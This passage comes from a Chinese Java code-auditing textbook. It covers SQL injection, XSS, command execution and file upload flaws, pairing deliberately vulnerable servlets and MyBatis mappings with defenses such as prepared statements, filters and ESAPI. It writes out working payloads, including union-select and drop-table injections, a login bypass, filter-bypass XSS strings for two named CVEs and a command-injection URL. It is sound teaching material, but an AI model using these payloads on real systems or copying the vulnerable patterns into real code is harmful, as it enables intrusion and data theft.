添加前台页面index.jsp代码，本小节以登录功能的表单为例，该JSP页面发送HTTP的POST请求将参数用户名（username）和密码（password）传递至后台Servlet处理，代码如下：



<body>

  <FORM method="post" action="login">

​    Username:<input type="text" name="username" /><br /> 

​    Password:<input type="password" name="password" /><br /> 

​    <input type="submit" value="login" />

  </FORM>

</body>



新建处理上述index.jsp页面的LoginServlet.java代码文件，通过集成HttpServlet类，并重写doGet和doPost方法，通过request对象获取参数username和password。其代码如下：



public class LoginServlet extends HttpServlet{

  @Override

  protected void doGet(HttpServletRequest req, HttpServletResponse resp)

​      throws ServletException, IOException {

​    **String username = req.getParameter("username");**

​    **String password = req.getParameter("password");**

​    //设置返回数据的编码

​    resp.setContentType("text/html;charset=UTF-8");

​    resp.getWriter().print("登陆成功");

  }

  @Override

  protected void doPost(HttpServletRequest req, HttpServletResponse resp)

​      throws ServletException, IOException {

​    doGet(req, resp);//给doGet处理

  }

}



最后对网站的web.xml文件进行修改，将上述创建的index.jsp文件、LoginServlet.java文件、URL路径进行映射，web.xml文件内容如下：



<welcome-file-list>

  **<welcome-file>index.jsp</welcome-file>   <!—欢迎文件列表为index.jsp-->**

 </welcome-file-list>

 <servlet>

   **<servlet-name> LoginServlet </servlet-name>      <!—servlet****名称-->**

  **<servlet-class>LoginServlet</servlet-class> <!—servlet类，该名称对应上文的LoginServlet.java文件-->**

 </servlet>

 <servlet-mapping>

  **<servlet-name> LoginServlet </servlet-name>      <!—servlet名称-->**

  **<url-pattern>/login</url-pattern>        <!—servlet对应的路径-->**

 </servlet-mapping>



## 13.2 Java代码中的SQL注入漏洞

与PHP中的SQL注入漏洞类似，Java代码中的SQL注入漏洞同样由于以下几点引起：

l 传递的参数用户可控；

l 系统未对传入后台的参数进行特殊字符过滤；

l SQL语句以拼接形式执行。

Java EE网站开发过程中，连接数据库的方法包括：JDBC、Mybatis、Hibernate，由于其使用的框架有所区别，从而导致其存在的SQL注入漏洞形式也不尽相同，本小节将给出常见框架的SQL注入漏洞。

### 13.2.1 JDBC的SQL注入

1.JDBC的SQL注入案例

SQL注入产生的原因是拼凑SQL，绝大多数程序员在开发时并不会去关注SQL语句最终是怎样运行的，更不会去关注SQL执行的安全性。这将导致攻击者可通过参数拼接后台SQL语句并执行。JDBC的SQL注入的典型拼接方式为使用加号“+”，例如："SELECT * from corps where id = "+id;

下面代码功能为通过参数id查询产品的信息页面。其使用JDBC连接数据库且存在SQL注入漏洞。



public class JDBCSqlInjectionTest {

  public static void sqlInjectionTest(String id){

​    String MYSQLURL = "jdbc:mysql://localhost:3306/wooyun?user=root&password=caonimei&useUnicode=true&characterEncoding=utf8&autoReconnect=true";         //Mysql连接字符串

​    **String sql = "SELECT \* from corps where id = "+id;//****拼接SQL查询语句**

​    try {

​      Class.forName("com.mysql.jdbc.Driver");     //加载MYSQL驱动

​      Connection conn = DriverManager.getConnection(MYSQLURL);//获取数据库连接

​       **PreparedStatement pstt = conn.prepareStatement(sql);**//执行SQL语句

​      **ResultSet rs = pstt.executeQuery();**

​      while(rs.next()){                  //结果遍历

​     System.out.println("ID:"+rs.getObject("id"));//ID

​     System.out.println("厂商:"+rs.getObject("corps_name"));//输出厂商名称

​     System.out.println("主站"+rs.getObject("corps_url")); //厂商URL}

​      rs.close();                    //关闭查询结果集

​      pstt.close();               //关闭PreparedStatement

​      conn.close();                    //关闭数据连接

​    } catch (ClassNotFoundException e) {

​      e.printStackTrace();

​    } catch (SQLException e) {

​      e.printStackTrace();

​    }}

  public static void main(String[] args) {

​    sqlInjectionTest("**2 and 1=2 union select version(),user(),database(),5** ");                            //查询id为2的厂商

  }}



上述代码的业务流程为：

l 使用变量id拼接SQL语句"SELECT * from corps where id = "+id；。

l 加载MySQL驱动com.mysql.jdbc.Driver。

l 执行SQL语句将结果进行遍历并打印。

l 关闭数据库连接与驱动资源。

2.漏洞分析

该案例中未对参数id进行严格过滤，并将id拼接至了SQL语句执行。参数id传递的值为2 and 1=2 union select version(),user(),database(),5后，SQL语句将被拼接为：select * from corps where id = 2 and 1=2 union select version(),user(),database(),5。执行成功后，数据库的版本、用户名、名称将打印至前台页面，结果如图13-4所示。

**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image602.gif)**

图13-4 拼接SQL代码

### 13.2.2 Mybatis的SQL注入

Java EE目前开发过程已经很少使用JDBC进行数据库连接，目前主流的持久层框架是Mybatis，它支持自定义SQL、存储过程以及高级映射。Mybatis免除了几乎所有的JDBC代码以及设置参数和获取结果集的工作，其可以通过简单的XML或注解来配置和映射原始类型、接口。

（1）   Mybatis的基础SQL注入漏洞

Mybatis将数据库执行语句抽象为XML文件，例如：用户管理功能的文件名称为：UserDao.xml，而基于Mybatis的SQL注入漏洞出现在该XML文件中。下面代码为存在SQL注入漏洞的XML文件内容，参数username通过符号“${}”形式直接将变量拼接至SQL语句中并执行，$将传入的数据直接显示生成在SQL中。

例如：where username=${username}，如果传入的值是111，那么解析成SQL时的值为where username=111；如果传入的值是;drop table user;，则解析成的SQL语句为：select id, username, password, role from user where username=;drop table user;。拼接成的SQL语句不仅执行了查询操作，同时还删除了user表。



<select id="selectByPrimaryName" resultMap="BaseResultMap" parameterType="java.lang.String">

​    select

​    <include refid="Base_Column_List">

​    from tb_admin

**//使用$符号将username直接拼接为SQL语句，存在漏洞**

​    where username = **${username}**

</select>



当攻击者使用Payload为“username='1212' or '1'='1' LIMIT 0,1&password=2223”即可通过万能密码成功登录系统，通过BurpSuite进行测试的数据包如图13-5所示，其返回状态为1，说明登录成功。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image604.jpg)

图13-5 抓取的数据包图

（2）   Mybatis的SQL注入漏洞防御

通过使用符号“#{}”将执行的SQL语句进行预编译，从而使得传递参数无法被当作SQL语句执行。符号“#”将传入的数据都当成字符串，并自动为传入数据添加双引号保护。从而有效的防御SQL注入漏洞。

例如：where username=#{username}，如果传入的值为111，其解析成SQL语句时的值为where username="111"，如果传入的值是id，则解析成的sql为where username="id"。



<select id="selectByPrimaryName" resultMap="BaseResultMap" parameterType="java.lang.String">

​    select

​    <include refid="Base_Column_List">

​    from tb_admin

**//使用#符号将username进行预编译，防御SQL注入漏洞**

​    where username = **#{username}**

</select>



（3）   Mybatis的SQL注入漏洞案例

在基于Mybatis框架的Java白盒代码审计工作中，通常将着手点定位在Mybatis的配置文件中。通过查看这些与数据库交互的配置文件来确定SQL语句中是否存在拼接情况。通过总结，Mybatis框架下易产生SQL注入漏洞的情况包括：模糊查询like、in查询、order by排序。

l 模糊查询like

like不能直接使用预编译，如果在未处理好参数的情况下进行传入，将可能产生SQL注入漏洞。使用Mybatis进行模糊查询，如果考虑安全编码规范问题，其对应的SQL语句如下：



select id="findlike" resultType="com.test.domain.User" parameterType="string">

​    select * from user where name like  **'%#{name}%'****，**

  </select>



但是上述代码运行时，代码将会抛出异常，因此研发人员将SQL查询语句修改如下：



select id="findlike" resultType="com.test.domain.User" parameterType="string">

​    select * from user where name like  **'****%${name}%'，**

  </select>



在这种情况下程序虽不再报错，但$符号不会自动为变量添加双引号保护，从而存在SQL语句拼接问题。如果Java代码层面没有对用户输入的内容做处理将会产生SQL注入漏洞。

l in查询

in查询原理与like查询原理相同，当用户输入1001,1002,1003…100N时，如果考虑安全编码规范问题，其对应的SQL语句如下：



Select * from news where id in **(#{id})****，**



但这样写程序会报错，研发人员会将SQL查询语句修改为：



Select * from news where id in **(${id})****，**



修改SQL语句之后，程序停止报错，但是却引入了SQL语句拼接的问题，如果研发人员没有对用户输入的内容做过滤将会产生SQL注入漏洞。

l order by排序

当根据发布时间、点击量等信息对新闻进行排序的时候，如果考虑安全编码规范问题，其对应的SQL语句如下：



Select * from news where title =‘新闻’ order by **#{time}** asc，



但由于发布时间time不是用户输入的参数，无法使用预编译。研发人员将SQL查询语句修改如下：



Select * from news where title =‘新闻’ order by **${time}** asc，



修改之后，程序通过预编译，但是产生了SQL语句拼接问题将可能引发SQL注入漏洞。

### 13.2.3   Java的SQL注入漏洞防御

Java代码中SQL注入漏洞的修复方式主要包括的方式如下：

l 为Web添加全局过滤器

在Web应用中Web.xml文件中添加全局过滤器SQLFilter，从而过滤参数传递过程中的特殊字符，在Web.xml文件中添加的内容如下：



<filter>

<filter-name>SQLFilter</filter-name>  //过滤器的名称

<filter-clsss>user.Filter.SQLFilter</filter-class> //过滤器使用java文件

</filter>

<filter-mapping>

<filter-name>SQLFilter</filter-name> //过滤器的名称

<url-pattern>/*</url-pattern>     //过滤器拦截的请求，拦截所有请求

</filter-mapping>



上述XML文件中添加了过滤器SQLFilter，该过滤器是一个名为SQLFilter.java的文件，其主要用来过滤特殊字符包括：||、and、or、select等，代码内容如图13-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image606.gif)

图13-6 过滤器代码图

l 使用预编译的方式防御SQL注入

针对于JDBC连接数据库的情况，使用预编译的方式可以有效的防御SQL注入漏洞。未进行SQL注入防御的代码：



public User login(Connection con,User user) throws Exception{
   User resultUser = null;
   **String sql = "select \* from t_user where userName='"+user.getUserName()+"' and password = '"+user.getPassword()+"'";         //****拼接数据库SQL语句
**   java.sql.StateMent stmt = con.createStatement();

ResultSet res = stmt.executeQuery(sql);        //执行数据库SQL语句
   if(res.next()){
     resultUser=new User();
     resultUser.setUserName(res.getString("userName"));
     resultUser.setPassword(res.getString("password"));
   }
   return resultUser;
 }



上述代码使用变量java.sql.Statement进行数据库连接并执行SQL语句，其可能存在SQL注入漏洞。

防御方法是将变量Statement修改为PreparedStatement，从而预编译SQL语句。同时，编写SQL语句时使用占位符“?”代替字段的值，从而可以固定sql语句格式。



public User login(Connection con,User user) throws Exception{

  User resultUser = null;

   **String sql = "select \* from t_user where userName=? and password = ?";**

  **PreparedStatement pstmt = con.prepareStatement(sql);//将sql语句进行预编译**

  **pstmt.setString(1,user.getUserName());       //sql****语句设置用户名**

  **pstmt.setString(2,user.getPassword());       //sql语句设置密码**

  ResultSet rs = pstmt.executeQuery();        //执行sql语句

  if(rs.next()){

​    resultUser=new User();

​    resultUser.setUserName(rs.getString("userName"));

​    resultUser.setPassword(rs.getString("password"));

  }

  return resultUser;

}



### 13.2.4   OFCMS平台SQL注入漏洞分析

（1）漏洞分析

CVE-2019-9615漏洞出现于OFCMS平台V1.1.3版本之前，该平台是基于Java技术开发的内容管理系统，当用户访问路径为“admin/system/generate/create?sql=xxx”时，将调用该平台的“代码生成”功能，如图13-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image608.gif)

图13-7 OFCMS存在SQL注入漏洞功能点

该功能存在SQL注入漏洞，其对应的文件位于\ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\system\SystemGenerateController.java处。下面给出该文件代码：



//接收HTTP请求路径为/system/generate

@Action(path = "/system/generate", viewPath = "system/generate/")
 public class SystemGenerateController extends BaseController {

public void create() {
    try {
     String sql = getPara("sql");//获取HTTP请求的参数sql
     Db.update(sql);       //根据参数sql更新数据库
     rendSuccessJson();     //发送成功的Json
    } catch (Exception e) {    //异常处理
     e.printStackTrace();
     rendFailedJson(ErrorCode.get("9999"), e.getMessage());
    }
  }
 }



上述代码使用getPara()函数获取参数SQL，然后调用Db.update(SQL)直接执行sql语句，返回json格式的数据。该程序对传入的参数未进行过滤就直接执行，从而造成SQL注入漏洞。

（2）漏洞利用

当使用测试的Payload为update of_cms_link set link_name='panda' where link_id = 4时，使用BurpSuite拦截HTTP请求，并使用SQL执行监控工具发现其并未对SQL语句进行转义或过滤，如图13-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image610.gif)

图13-8 SQL语句执行监控图

由于该功能点只支持update语句，可使用报错型SQL注入。为该CMS构造Payload为：update of_cms_link set link_name=updatexml(1,concat(0x7e,(user())),0) where link_id = 4。执行成功后页面将打印目前使用的用户名为“zengcms”，如图13-9所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image612.gif)

图13-9 OFCMS SQL注入漏洞图

## 13.3 Java代码中的XSS漏洞

### 13.3.1 Java中的XSS漏洞

（1）  反射型XSS

PHP代码中会使用echo对用户输入参数直接输出导致xss漏洞。而在Java中将接收到的未经过滤参数共享到request对象中，并在JSP页面里面使用EL表达式进行输出。

下面给出Java中的XSS漏洞案例，XSS的Servlet代码如下：



@WebServlet("/demo")

public class xssServlet extends HttpServlet {

  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

​    this.doGet(request,response);

  }

  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

​    response.setContentType("text/html");// 设置响应类型

​    String content = **request.getParameter("content");/**/获取content传参数据

​    **request.setAttribute("content", content);**  //content共享到request域中

​    request.getRequestDispatcher("**/WEB-INF/pages/xss.jsp**").forward(request, response); //转发到xxs.jsp页面中

  }}



上述代码流程为：

l 处理请求URL为“/demo”；

l xssServlet类继承HttpServlet类，可处理GET及POST请求；

l doGet方法中，将获取HTTP参数content并将该参数的值放置到request对象中；

l 将request对象转发到/WEB-INF/pages/xss.jsp页面中。

下面给出/WEB-INF/pages/xss.jsp页面代码：



<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<html>

<head>

  <title>Title</title>

  **${requestScope.content}//****将request对象中的content内容显示至前台页面**

</head>

</html>



上述程序将响应内容${requestScope.content}打印至页面。用户启动Tomcat服务器后，访问URL为http://localhost/test/demo?content=1，可将后台值content为1打印至页面。

若用户输入http://localhost/test/demo?content=<script>alert("xss")</script>，则可以将JS代码<script>alert("xss")</script>打印至首页并成功弹窗，如图13-10所示。Java代码审计XSS漏洞时，同样也需要关注参数是否可控的问题。如果传入参数可控，则该参数将共享到request中并显示至前台页面，就可能存在XSS漏洞。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image614.jpg)

图13-10 Java反射XSS图

（2）  存储型XSS

与PHP代码审计类似，Java中的存储型XSS漏洞同样由于传递参数被用户可控，且参数在传递过程中未经过有效过滤，从而将恶意脚本存储在数据库中，当前台显示数据库中数据时将执行恶意的JS脚本，其案例代码：



public String adduser() throws IOException{

//定义HTTP请求对象request
   HttpServletRequest request = ServletActionContext.getRequest();

//定义HTTP响应对象response
   HttpServletResponse response = ServletActionContext.getResponse();

//获得请求参数username、password、relname、introduction
    String username = request.getParameter("username"); 
    String password = request.getParameter("password");
    String relname = request.getParameter("relname");
    String introduction = request.getParameter("introduction");
    AddUserService adds = new AddUserService();

//使用参数添加用户
    **int i = adds.adduser(username,password,relname,introduction);**
   }



上述代码将调用adduser方法使用参数username、password、introduction、relname添加用户。而adduser方法则执行SQL语句：“insert into test(username,password,relname,person) values (?,?,?,?);”向test表中插入用户。

当用户访问用户列表时，程序将执行SQL语句：“select * from test”，将所有用户信息打印值前台页面。此时，如果数据表中存储了恶意脚本，也同样会被打印至前台并执行。下面给出显示至页面前台的JSP代码：



  <%**List<MessageInfo> msginfo = (ArrayList<MessageInfo>)request.getAttribute("msg");//****循环遍历数组msginfo**

  **for(MessageInfo m:msginfo)**{%>

<table>

  <tr><td class="klytd"> 用户名：</td>

  <td class ="hvttd">　<%=**m.getName()** %></td></tr> //获取用户名

<tr><td class="klytd">密码：</td>

<td class ="hvttd">　<%=**m.getPasswd()** %></td></tr>//获取密码

<tr><td class="klytd"> 介绍：</td>

<td class ="hvttd">　<%=**m.getIntroduct()** %></td></tr>//获取介绍

</table> <% **}** %>

</div>



（3）  DOM型XSS

DOM型XSS原理与反射型XSS类似，其通过可控参数拼接为DOM标签输出，其常见的DOM标签请参考本书第四章，本小节只给出案例Java代码如下:



<html>

<body>

       <div id="a" style="height:300px;width:400px;border:2px solid red" />

       <script>//将id为a的元素内容替换为请求参数为a的值

​    **document.getElementById("a").innerHTML="<%=request.getParameter("a")%>";**

​    </script>

</body>

</html>



  通过输入请求http://localhost:8080/javatest/DOMtest.jsp?a=123456789。可以将可控参数a的值显示至页面如图13-11所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image616.gif)

图13-11 DOM XSS测试图

当可控参数a为<img src=1 onerror=alert(1)>时，该恶意脚本将在前台页面执行，如图13-12所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image618.gif)

图13-12 DOM型XSS弹窗图

### 13.3.2   Java中XSS漏洞防御

（1）  全局过滤函数XSSFilter

Java代码中防御XSS攻击通常需要添加一个防御器XSSFilter。输入参数在传入后台前，先调用全局防御器进行参数过滤，检测是否存在XSS的敏感函数或字符，如果存在敏感字符则对其进行替换。在Web应用的web.xml文件中可添加该全局过滤器XSSFilter，该文件中添加的内容如下：



<filter>

<filter-name>**XSSFilter**</filter-name>

<filter-clsss>user.Filter.XSSFilter</filter-class>

</filter>

<filter-mapping>

<filter-name>**XSSFilter**</filter-name>

<url-pattern>/*</url-pattern><!--拦截所有的请求-->

</filter-mapping>



上述XML文件中添加了过滤器XSSFilter，该过滤器是一个名为XSSFilter.java的Java类，该类用来将特殊字符替换为“\\*”，替换的特殊字符包括：script、src等，代码如下：



public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {

private String xssClean(String value) {

​    if (value != null) {

​      value = value.replaceAll("\0", "");

​      //替换特殊字符<script>(.*?)</script>为空字符

​      Pattern scriptPattern = Pattern.compile("**<script>(.\*?)</script>**",

​          Pattern.CASE_INSENSITIVE);

​      value = **scriptPattern.matcher(value).replaceAll("");**

​      //替换特殊字符src[\r\n]*=[\r\n]*\\\'(.*?)\\\'为空字符

​      scriptPattern = Pattern.compile("**src[\r\n]\*=[\r\n]\*\\\'(.\*?)\\\'**",

​          Pattern.CASE_INSENSITIVE | Pattern.MULTILINE

​              | Pattern.DOTALL);

​      value = **scriptPattern.matcher(value).replaceAll("");**

​      …省略…

}



（2）  企业安全API（ESAPI）防御

除了上文提过的使用全局过滤函数防御XSS漏洞外，还可使用第三方API进行XSS漏洞过滤。ESAPI项目是OWASP项目，可为每个Web平台创建简单的强大安全控件。该控件旨在消除Web安全漏洞的应用程序。

若该应用程序使用Maven进行依赖控制，则可以在pom.xml文件中导入ESAPI依赖如下：



<dependency>

  <groupId>org.owasp.esapi</groupId>

  <artifactId>esapi</artifactId>

  <version>2.2.1.1</version>

</dependency>



过滤的Servlet代码如下，其将传递的参数content使用ESAPI进行实体编码，将恶意脚本代码进行转换，然后才将参数值共享到request中，经过编码转换的脚本将无法正常执行，从而抵御XSS漏洞攻击。



@WebServlet("/demo")

class xssServlet extends HttpServlet {

  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

​    this.doGet(request,response);}

  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException, ServletException, IOException {

   response.setContentType("text/html");// 设置响应类型

   String content = request.getParameter("content"); //获取content传参数据

   **String s = ESAPI.encoder().encodeForJavaScript(content); //****进行实体编码**

​    **request.setAttribute("content", s); //content****共享到request域**

   request.getRequestDispatcher("/WEB-INF/pages/xss.jsp").forward(request, response); //转发到xxs.jsp页面中

  }

}



### 13.3.3  JEESNS平台XSS漏洞分析

（1）漏洞分析

JEESNS是一款基于JAVA企业级平台研发的社交管理系统，在JEESNS V1.3版本中，com/lxinet/jeesns/core/utils/XssHttpServletRequestWrapper.java 文件允许通过HTML的<embed> 标签插入XSS攻击代码，形成存储型XSS漏洞。该漏洞编号为CVE-2018-19178。

审计该网站的XSS漏洞包括两方面：

l 该网站是否存在XSS过滤，且可否绕过。

l XSS过滤作用于哪些请求。

首先对该网站XSS过滤函数XssHttpServletRequestWrapper.java 文件审计，其代码如下：



/* XSS攻击处理*/

 public String getParameter(String parameter) {

​    String value = super.getParameter(parameter);

​    if (value == null) {return null;}

​    return **cleanXSS**(value);//对请求参数值调用cleanXSS函数过滤

  }

  ......

  private String **cleanXSS**(String value) {

**/\*过滤字符为<style>、</style>、<script>、</script>、<script 、eval\\((.\*)\\)、[\\\"\\\'][\\s]\*javascript:(.\*)[\\\"\\\']\*/**

​    value = value.replaceAll("**(?i)<style>**", "&lt;style&gt;").replaceAll("**(?i)</style>**", "&lt;&#47;style&gt;");

​    value = value.replaceAll("**(?i)<script>**", "&lt;script&gt;").replaceAll("**(?i)</script>**", "&lt;&#47;script&gt;");

​    value = value.replaceAll("**(?i)<script**", "&lt;script");

​    value = value.replaceAll("**(?i)eval\\((.\*)\\)**", "");

​    value = value.replaceAll("**[\\\"\\\'][\\s]\*javascript:(.\*)[\\\"\\\']**", "\"\"");

​    // 需要过滤的脚本事件关键字

​    String[] eventKeywords = { **"onmouseover", "onmouseout", "onmousedown",**

​        **"onmouseup", "onmousemove", "onclick", "ondblclick",**

​        **"onkeypress", "onkeydown", "onkeyup", "ondragstart",**

​        **"onerrorupdate", "onhelp", "onreadystatechange", "onrowenter",**

​        **"onrowexit", "onselectstart", "onload", "onunload",**

​        **"onbeforeunload", "onblur", "onerror", "onfocus", "onresize",**

​        **"onscroll", "oncontextmenu", "alert"** };

​    // 滤除脚本事件代码

​    for (int i = 0; i < eventKeywords.length; i++) {

​      // 添加一个"_", 使事件代码无效

​      value = value.replaceAll(**eventKeywords[i],"_" + eventKeywords[i]**);

​    }

​    return value;//返回过滤后的结果

  }

}



上述代码流程：

l 获取参数parameter的值，判断是否为空；

l 对参数值进行XSS过滤，分别过滤常用JS标签及事件关键字；

l 返回过滤后的结果。

然后，还需要确定上述过滤函数作用于哪些请求，审计该网站的web.xml文件，其过滤器代码如下：



<filter>
   <filter-name>XssSqlFilter</filter-name><!—过滤器名称-->
   **<filter-class>com.lxinet.jeesns.core.filter.XssFilter</filter-class>**

<!—使用的过滤器类-->
 </filter>
 <filter-mapping>
   <filter-name>XssSqlFilter</filter-name><!—过滤器名称-->
   **<url-pattern>/\*</url-pattern>**<!—过滤器哪些请求，这里过滤/*即所有请求-->
   <dispatcher>REQUEST</dispatcher><!—声明调度-->
 </filter-mapping>



至此，可知该XSS过滤器将作用于该网站的所有请求，并过滤REQUEST对象的参数值，但是该网站依旧存在XSS漏洞。如果攻击者设计的Payload可以绕过XSS过滤函数，将导致XSS漏洞的产生。

（2）漏洞利用

当使用测试的Payload为<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">将绕过上述的过滤函数，其中“PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=”是字符串“Hello”被base64编码后的结果。除此之外，还可使用的Payload包括： <svg/onLoad=confirm(1)>、<img src="x" ONERROR=confirm(0)>等。

在该网站的文章发布功能中提交上述的Payload并点击“发布”按钮，当再次访问文章列表后将出现弹框，如图13-13所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image620.gif)

图13-13 JEESNS V1.3 XSS漏洞

## 13.4 Java代码中的命令执行漏洞

### 13.4.1 Java中的命令执行漏洞

命令执行漏洞的原理是开发人员没有针对代码中可执行的特殊函数或自定义方法入口进行过滤，从而导致客户端可以提交恶意构造语句，并交由服务器端执行。与PHP中命令执行函数不同，Java中能存在命令执行漏洞的类并不多，通过Java执行系统命令的方法包括：Runtime.getRuntime().exec(command)和new ProcessBuilder(cmdArray).start()。

（1）  Runtime类

Runtime这个函数有exec方法可以本地执行命令，大部分关于JSP命令执行的payload可能都是调用Runtime进行Runtime的exec方法进行命令执行的。

下面给出Runtime类存在命令执行漏洞的案例代码：



@WebServlet("/execServlet")

public class execServlet extends HttpServlet {

  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

  this.doGet(request, response);

  }

  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

​     **String exec = request.getParameter("exec");**

​    **Process res = Runtime.getRuntime().exec(exec);**

​     **InputStream inputStream = res.getInputStream();**

​    ServletOutputStream outputStream = response.getOutputStream();

​    int len;

​    byte[] bytes = new byte[1024];

​    while ((len = inputStream.read(bytes))!=-1){

​      outputStream.write(bytes,0,len);

​    }}}



当攻击者使用的Payload为http://localhost:8080/ execServlet?exec=ipconfig即可执行dos指令ipconfig，图13-14为执行结果。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image622.jpg)

图13-14 命令执行测试图

（2）  ProcessBuilder类

使用ProcessBuilder进行命令执行非常简单，只需要通过传递参数exec，然后在ProcessBuilder的构造函数传入该参数，并调用 start方法即可执行命令。

下面给出ProcessBuilder类存在命令执行漏洞的案例代码：



@WebServlet("/exec2Servlet")

public class exec2Servlet extends HttpServlet {

  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

​     **String exec = request.getParameter("exec");**

​    **ServletOutputStream outputStream = response.getOutputStream();**

​    **ProcessBuilder processBuilder = new ProcessBuilder(exec);**

​    **Process res = processBuilder.start();**

​    InputStream inputStream = res.getInputStream();

​    int len ;

​    byte[] bytes =new byte[1024];

​    while ((len = inputStream.read(bytes))!=-1){

​      outputStream.write(bytes,0,len);

​    } } }



当攻击者使用的Payload为http://localhost:8080/ exec2Servlet?exec=ipconfig即可执行dos指令ipconfig，图13-15为执行图。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image624.jpg)

图13-15 命令执行测试图

### 13.4.2 Java中命令执行漏洞防御

由于命令执行所处的场景不同，因此修复的方式也要根据实际场景来。总的来说，需要注意以下几点：

l 如果需要将用户的输入用作程序命令中的参数，那么需要对用户的输入进行过滤，但实际场景过于复杂、参数难以追踪，导致这种过滤难度很大，在程序有选择的过滤潜在的危险字符时，只要攻击者的字符不在其黑名单内，那么应用程序受到攻击的概率将显著提高，所以更好的方法是组建一份白名单，允许其中的字符出现在输入中，并只接受完全由这些经认可的字符组成的输入，当然这种方案并不是完美的，有时候攻击者通过白名单内的字符组建绕过检测，同样可以达到攻击的目的，因此如何构建白名单、如果设置过滤机制是关键。

l 有时候攻击可以通过修改环境中的命令指令来达到攻击的效果，因此应该设置绝对路径来执行命令。

l 严格设置权限，有时用户所需执行命令仅需很小的权限，如果在代码中不设置setAccessible(true);，那么攻击者就无法调用 Runtime.exec()执行命令。

## 13.5 Java代码中的文件操作漏洞

### 13.5.1 Java中的文件上传漏洞

Java代码的文件上传功能涉及到其输入/输出流，Java中支持文件上传的功能类包括：RandomAccessFile和commons-fileupload组件。

（1）  RandomAccessFile类文件上传案例

RandomAccessFile是Java输入/输出流体系中功能最丰富的文件内容访问类，其既可以读取文件内容，也可以向文件输出数据。与普通的输入/输出流不同，RandomAccessFile支持跳到文件任意位置读写数据，RandomAccessFile对象包含一个记录指针，用以标识当前读写处的位置，当程序创建一个新的RandomAccessFile对象时，该对象的文件记录指针对于文件头（也就是0处），当读写n个字节后，文件记录指针将会向后移动n个字节。

RandomAccessFile包含两个方法来操作文件记录指针：

l long getFilePointer()：返回文件记录指针的当前位置；

l void seek(long pos)：将文件记录指针定位到pos位置。

RandomAccessFile类在创建对象时，除了指定文件本身，还需要指定一个mode参数，该参数指定RandomAccessFile的访问模式，该参数有如下四个值：

l r：以只读方式打开指定文件。如果试图对该RandomAccessFile指定的文件执行写入方法则会抛出IOException；

l rw：以读取、写入方式打开指定文件。如果该文件不存在，则尝试创建文件；

l rws：以读取、写入方式打开指定文件。相对于rw模式，还要求对文件的内容或元数据的每个更新都同步写入到底层存储设备，默认情形下(rw模式下)，是使用buffer的，只有cache满的或者使用RandomAccessFile.close()关闭流的时候儿才真正的写到文件；

l rwd：与rws类似，只是仅对文件的内容同步更新到磁盘，而不修改文件的元数据。

下面给出使用RandomAccessFile进行文件上传的案例代码，其代码流程：

l 从/upload文件夹中读取临时文件temp.tmp。

l 使用RandomFile写入文件。

代码中并未写入文件进行类型校验，从而导致该代码功能存在任意文件上传漏洞。案例代码如下：



**@WebServlet("/FileUploadServlet")**

public class domain extends HttpServlet {

…省略…

​    **File saveFile = new File(realPath,filename);//****定义需要保存的文件**

​    **RandomAccessFile randomAccessFile = new RandomAccessFile(saveFile, "rw");**

​    **randomFile.seek(randomFile.length());//****定位文件长度**

​    **long endPosition = randomFile.getFilePointer();//获取文件指针的当前位置**

​    int j = 1;

​    while((endPosition >= 0) && j <= 2){

​      endPosition --;

​      randomFile.seek(endPosition);

​      if(randomFile.readByte() =='\n'){

​        j++;

​      }}

​     **randomFile.seek(start);**

​     **long startPoint = randomFile.getFilePointer();**

​    while(startPoint < endPosition-1){

​       **randomAccessFile.write(randomFile.readByte());//****开始写文件内容**

​       **startPoint = randomFile.getFilePointer();**}

​    randomAccessFile.close();

​    randomFile.close();

​    tempFile.delete();

​    System.out.println("文件上传成功");

  }

}



（2）  commons-fileupload组件文件上传案例

commons-fileupload组件是由Apache开发的一个应用于文件上传组件，该组件也可用于Java中的文件上传功能。

下面给出使用commons-fileupload进行文件上传的案例代码，代码中直接从request中读取文件，并将文件写入到WEB-INF/upload目录下，该写入文件前只判断了文件是否为空，并没有对文件类型进行判断，因此存在任意文件上传漏洞。



@WebServlet("/FileUploadServlet")

public class domain extends HttpServlet{

  @Override

  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

​    //得到上传文件的保存目录，将上传的文件存放于WEB-INF目录下，不允许外界直接访问，保证上传文件的安全

​    **String savePath = this.getServletContext().getRealPath("/WEB-INF/upload");**

​    File file = new File(savePath);

​    if(!file.exists()&&!file.isDirectory()){

​      System.out.println("目录或文件不存在！");

​      file.mkdir();}

​    String message = "";

​    try {//使用Apache文件上传组件处理文件上传步骤：

​      //1、创建一个DiskFileItemFactory工厂

   DiskFileItemFactory diskFileItemFactory = new DiskFileItemFactory();

​      //2、创建一个文件上传解析器

